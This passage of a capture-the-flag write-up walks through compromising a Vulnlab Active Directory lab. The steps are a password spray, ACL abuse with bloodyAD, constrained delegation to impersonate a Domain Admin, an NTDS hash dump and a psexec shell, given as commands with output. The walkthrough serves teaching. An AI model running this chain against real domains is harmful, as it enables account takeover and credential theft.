SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF5010000)</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">REDELEGATE\Guest</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF6010000)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">REDELEGATE\krbtgt</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>After some time, we end up with a comprehensive list of usernames and groups.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">➜  strings result.txt | grep &#x27;REDELEGATE&#x27;</span><br><span class="line">REDELEGATE\Guest</span><br><span class="line">REDELEGATE\krbtgt</span><br><span class="line">REDELEGATE\Domain Admins</span><br><span class="line">REDELEGATE\Domain Users</span><br><span class="line">REDELEGATE\Domain Guests</span><br><span class="line">REDELEGATE\Domain Computers</span><br><span class="line">REDELEGATE\Domain Controllers</span><br><span class="line">REDELEGATE\Cert Publishers</span><br><span class="line">REDELEGATE\Schema Admins</span><br><span class="line">REDELEGATE\Enterprise Admins</span><br><span class="line">REDELEGATE\Group Policy Creator Owners</span><br><span class="line">REDELEGATE\Read-only Domain Controllers</span><br><span class="line">REDELEGATE\Cloneable Domain Controllers</span><br><span class="line">REDELEGATE\Protected Users</span><br><span class="line">REDELEGATE\Key Admins</span><br><span class="line">REDELEGATE\Enterprise Key Admins</span><br><span class="line">REDELEGATE\RAS and IAS Servers</span><br><span class="line">REDELEGATE\Allowed RODC Password Replication Group</span><br><span class="line">REDELEGATE\Denied RODC Password Replication Group</span><br><span class="line">REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG</span><br><span class="line">REDELEGATE\DC$</span><br><span class="line">REDELEGATE\FS01$</span><br><span class="line">REDELEGATE\Christine.Flanders</span><br><span class="line">REDELEGATE\Marie.Curie</span><br><span class="line">REDELEGATE\Helen.Frost</span><br><span class="line">REDELEGATE\Michael.Pontiac</span><br><span class="line">REDELEGATE\Mallory.Roberts</span><br><span class="line">REDELEGATE\James.Dinkleberg</span><br><span class="line">REDELEGATE\Helpdesk</span><br><span class="line">REDELEGATE\IT</span><br><span class="line">REDELEGATE\Finance</span><br><span class="line">REDELEGATE\DnsAdmins</span><br><span class="line">REDELEGATE\DnsUpdateProxy</span><br><span class="line">REDELEGATE\Ryan.Cooper</span><br><span class="line">REDELEGATE\sql_svc</span><br></pre></td></tr></table></figure>
<p>With some cleanup, we can extract a list of just the user accounts</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Christine.Flanders</span><br><span class="line">Marie.Curie</span><br><span class="line">Helen.Frost</span><br><span class="line">Michael.Pontiac</span><br><span class="line">Mallory.Roberts</span><br><span class="line">James.Dinkleberg</span><br><span class="line">Ryan.Cooper</span><br><span class="line">sql_svc</span><br></pre></td></tr></table></figure>
<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>Now that we have the domain users, we can perform a password spray using the wordlist we created earlier</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  nxc smb redelegate.vl -u users.txt -p passwords.txt --continue-on-success</span><br><span class="line">SMB         10.10.123.27    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line">...</span><br><span class="line">SMB         10.10.123.27    445    DC               [+] redelegate.vl\Marie.Curie:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
<p>We successfully got a hit on the user <code>Marie.Curie</code>. Let’s gather Bloodhound data to gain a better understanding of the network and the permissions our user have</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  nxc ldap redelegate.vl -u marie.curie -p &#x27;&lt;REDCATED&gt;&#x27; --bloodhound --dns-server 10.10.123.27 --dns-tcp -c all</span><br><span class="line">SMB         10.10.123.27    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.123.27    389    DC               [+] redelegate.vl\marie.curie:&lt;REDCATED&gt;</span><br><span class="line">LDAP        10.10.123.27    389    DC               Resolved collection methods: objectprops, dcom, psremote, trusts, session, container, rdp, localadmin, acl, group</span><br><span class="line">LDAP        10.10.123.27    389    DC               Done in 00M 16S</span><br><span class="line">LDAP        10.10.123.27    389    DC               Compressing output into /home/serioton/.nxc/logs/DC_10.10.123.27_2024-11-24_125924_bloodhound.zip</span><br></pre></td></tr></table></figure>
<h3 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h3><p>After loading the data into BloodHound, we identified 10 <code>Reachable High Value Targets</code> from our current user, Marie.Curie.<br><img src="/2024/11/24/Redelegate-Vulnlab/forcechangepassword.png"><br>She is a member of the Helpdesk group, which has the <code>ForceChangePassword</code> permission on the user Helen.Frost. We can use <code>bloodyAD</code> to change Helen’s password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bloodyAD --host 10.10.123.27 -d dc.redelegate.vl -u marie.curie -p &#x27;&lt;REDCATED&gt;&#x27; set password helen.frost &#x27;P@ssword1&#x27;</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>
<p>Now, we can use evil-winrm to access the filesystem and grab our user flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  evil-winrm -i redelegate.vl -u helen.frost -p P@ssword1</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Helen.Frost\Documents&gt; cd ..\desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Helen.Frost\desktop&gt; cat user.txt</span><br><span class="line">VL&#123;REDACTED&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Running <code>whoami /priv</code> reveals that our user has the <code>SeEnableDelegationPrivilege</code>, a dangerous permission that allows for both constrained and unconstrained delegations</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Helen.Frost\desktop&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                                    State</span><br><span class="line">============================= ============================================================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                                     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled</span><br><span class="line">SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled</span><br></pre></td></tr></table></figure>
<h2 id="A-word-on-Delegation"><a href="#A-word-on-Delegation" class="headerlink" title="A word on Delegation"></a>A word on Delegation</h2><p>There are 3 types of delegation:</p>
<ul>
<li>Unconstrained delegations (KUD): a service can impersonate users on any other service.</li>
<li>Constrained delegations (KCD): a service can impersonate users on a set of services</li>
<li>Resource based constrained delegations (RBCD) : a set of services can impersonate users on a service</li>
</ul>
<p>I’ll leave some resources to learn more about delegation in the Resources section below</p>
<h2 id="Constrained-Delegation"><a href="#Constrained-Delegation" class="headerlink" title="Constrained Delegation"></a>Constrained Delegation</h2><h3 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h3><p>Since we can’t add DNS entries and <code>maq</code> is set to 0, our only option is Constrained Delegation. However, Constrained Delegation requires a machine account, and fortunately, our user Helen.Frost has <code>GenericAll</code> over <code>FS01$</code>, which allows us to change its password.<br><img src="/2024/11/24/Redelegate-Vulnlab/genericall.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bloodyAD --host 10.10.123.27 -d dc.redelegate.vl -u helen.frost -p P@ssword1 set password fs01$ P@ssword2</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>
<p>Now that we have full control over <code>FS01$</code>, we can use it to execute the Constrained Delegation attack.<br>As mentioned in <a target="_blank" rel="noopener" href="https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/">this blogpost</a> to perform Constrained Delegation, the following steps are required:</p>
<ul>
<li>The <code>userAccountControl</code> attribute for the object must be updated with the <code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> flag.</li>
<li>The <code>msDS-AllowedToDelegateTo</code> attribute must be populated with the SPN configured on the delegation tab</li>
</ul>
<p>To proceed, let’s first set <code>msDS-AllowedToDelegateTo</code> to <code>cifs</code> (or <code>ldap</code>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Helen.Frost\desktop&gt; Set-ADComputer -Identity FS01 -Add @&#123;&#x27;msDS-AllowedToDelegateTo&#x27;=@(&#x27;cifs/dc.redelegate.vl&#x27;)&#125;</span><br></pre></td></tr></table></figure>
<p>Next, let’s set the <code>TrustedToAuthForDelegation</code> flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Helen.Frost\desktop&gt; Set-ADAccountControl -Identity &quot;FS01$&quot; -TrustedToAuthForDelegation $True</span><br></pre></td></tr></table></figure>
<p>To confirm that the attributes have been successfully set, we can use <code>findDelegation</code> from Impacket</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  findDelegation.py &#x27;redelegate.vl&#x27;/&#x27;fs01$:P@ssword2&#x27;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists</span><br><span class="line">-----------  -----------  ----------------------------------  ---------------------  ----------</span><br><span class="line">FS01$        Computer     Constrained w/ Protocol Transition  cifs/dc.redelegate.vl  No</span><br></pre></td></tr></table></figure>
<p>Another way to set the <code>TrustedToAuthForDelegation</code> is to use bloodyAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bloodyAD -u helen.frost -p &#x27;P@ssword1&#x27; -d redelegate.vl --host dc.redelegate.vl add uac &#x27;FS01$&#x27; -f TRUSTED_TO_AUTH_FOR_DELEGATION</span><br><span class="line">[-] [&#x27;TRUSTED_TO_AUTH_FOR_DELEGATION&#x27;] property flags added to FS01$&#x27;s userAccountControl</span><br></pre></td></tr></table></figure>
<p>Now, we use the credentials of fs01 to request a service ticket while impersonating any user.</p>
<blockquote>
<p>Notice that we cannot impersonate the Administrator user in this case because it has the <code>NOT_DELEGATED</code> attribute, meaning it’s a protected account, as you can see here</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  bloodyAD --host 10.10.123.27 -d dc.redelegate.vl -u helen.frost -p P@ssword1 get object administrator</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Administrator,CN=Users,DC=redelegate,DC=vl</span><br><span class="line">accountExpires: 1601-01-01 00:00:00+00:00</span><br><span class="line">adminCount: 1</span><br><span class="line">badPasswordTime: 2024-10-19 08:24:34.093144+00:00</span><br><span class="line">cn: Administrator</span><br><span class="line">dSCorePropagationData: 2024-10-20 11:55:18+00:00</span><br><span class="line">description: Built-in account for administering the computer/domain</span><br><span class="line">...</span><br><span class="line">userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>However, we can impersonate <code>ryan.cooper</code> since he is a Domain Admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  getST.py -impersonate ryan.cooper -spn cifs/dc.redelegate.vl &#x27;redelegate.vl/FS01$&#x27;:&#x27;P@ssword2&#x27;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Impersonating ryan.cooper</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket in ryan.cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  export KRB5CCNAME=ryan.cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache</span><br></pre></td></tr></table></figure>
<p>As you can see, we successfully authenticated using the ticket </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  nxc smb redelegate.vl --use-kcache</span><br><span class="line">SMB         redelegate.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         redelegate.vl   445    DC               [+] redelegate.vl\ryan.cooper from ccache (Pwn3d!)</span><br></pre></td></tr></table></figure>
<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>Next, let’s perform a DCSync attack and dump all the hashes, even though we can simply connect as ryan.cooper and retrieve the root flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  nxc smb redelegate.vl --use-kcache --ntds</span><br><span class="line">[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil [Y/n] y</span><br><span class="line">SMB         redelegate.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         redelegate.vl   445    DC               [+] redelegate.vl\ryan.cooper from ccache (Pwn3d!)</span><br><span class="line">SMB         redelegate.vl   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...</span><br><span class="line">SMB         redelegate.vl   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               DC$:1002:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">SMB         redelegate.vl   445    DC               FS01$:1103:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  psexec.py redelegate.vl/ryan.cooper@dc.redelegate.vl -k -no-pass</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on dc.redelegate.vl.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file YAsYJdGE.exe</span><br><span class="line">[*] Opening SVCManager on dc.redelegate.vl.....</span><br><span class="line">[*] Creating service Xpre on dc.redelegate.vl.....</span><br><span class="line">[*] Starting service Xpre.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2762]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; type C:\users\administrator\desktop\root.txt</span><br><span class="line">VL&#123;REDACTED&#125;</span><br></pre></td></tr></table></figure>
<p>That concludes this chain. I hope you learned something new! 🐱</p>
<h1 id="Rsources"><a href="#Rsources" class="headerlink" title="Rsources"></a>Rsources</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/">https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/">https://www.thehacker.recipes/ad/movement/kerberos/delegations/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/8-powerful-kerberos-attacks#mcetoc_1hlutnrrcu2l">https://www.hackthebox.com/blog/8-powerful-kerberos-attacks#mcetoc_1hlutnrrcu2l</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=byykEId3FUs&ab_channel=scrt.insomnihack">https://www.youtube.com/watch?v=byykEId3FUs&amp;ab_channel=scrt.insomnihack</a></li>
<li><a target="_blank" rel="noopener" href="https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html">https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html</a></li>
<li>Writeup of this machine by xct: <a target="_blank" rel="noopener" href="https://vuln.dev/vulnlab-redelegate/">https://vuln.dev/vulnlab-redelegate/</a></li>
</ul>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnlab/">vulnlab</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/12/01/BloodyAD-Cheatsheet/" title="BloodyAD Cheatsheet"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Febc8dc6e-40a9-492f-839f-b175138faa93%2Fcat.png?table=block&amp;id=14fd3b99-8509-80fd-bbe8-daf204d95fcc&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">BloodyAD Cheatsheet</div></div></a></div><div class="next-post pull-right"><a href="/2024/11/19/AD-ACLs-Cheatsheet/" title="AD ACLs Cheatsheet"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Ff66ee8a6-26a3-4033-891f-0379a8820600%2Fcat.png?table=block&amp;id=143d3b99-8509-8000-b976-d5c681cab379&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">AD ACLs Cheatsheet</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F32f31a6a-94e8-4f0c-a634-b4d25ddb3468%2Fbamboo_slide.webp?table=block&id=4a0a5659-6394-4650-b233-d1910b3f33f8&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1030&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-14</div><div class="title">Bamboo - Vulnlab</div></div></a></div><div><a href="/2024/05/28/Escape-Vulnlab/" title="Escape - Vulnlab"><img class="cover" src="https://wiki.vulnlab.com/~gitbook/image?url=https%3A%2F%2F3528174365-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FI3I73FFqB6GvT8N5Mt1N%252Fuploads%252Ft12lXmil2VV0iVqncZnv%252Fescape_slide.png%3Falt%3Dmedia%26token%3Dce1f8941-c579-4d9a-bb57-ea6de1e5252b&width=768&dpr=1&quality=100&sign=642a654e4f3d5c89f5bd79724228f6521b285446f0055d8b5050aced207fd1f8" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-28</div><div class="title">Escape - Vulnlab</div></div></a></div><div><a href="/2023/10/25/Job-Vulnlab/" title="Job - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Fdf7a8010-c06f-4ab7-b4ca-840c76b90893%2FUntitled.png?table=block&id=4eee05c7-64ed-409d-9fab-63f5a6e430ba&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-25</div><div class="title">Job - Vulnlab</div></div></a></div><div><a href="/2023/10/19/Media-Vulnlab/" title="Media - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F723ecb50-3ce1-43a7-8202-b53f76aa2ccf%2Fmedia.png?table=block&id=965e07b3-adbf-4f84-b843-97ecaafe658a&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-19</div><div class="title">Media - Vulnlab</div></div></a></div><div><a href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab"><img class="cover" src="https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FqlrTgqfYZ2LxYiFsS7F0%2Flock_slide.png?alt=media&token=4a34abe6-3e20-4725-9334-bd39e2db903a" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-20</div><div class="title">Lock - Vulnlab</div></div></a></div><div><a href="/2024/08/18/Reflection-Vulnlab/" title="Reflection - Vulnlab"><img class="cover" src="https://assets.vulnlab.com/reflection_slide.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-18</div><div class="title">Reflection - Vulnlab</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">cat</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/seriotonctf"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/seriotonctf" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#User"><span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP"><span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-text">MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Domain-Accounts"><span class="toc-text">Enumerating Domain Accounts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ForceChangePassword"><span class="toc-text">ForceChangePassword</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#A-word-on-Delegation"><span class="toc-text">A word on Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Constrained-Delegation"><span 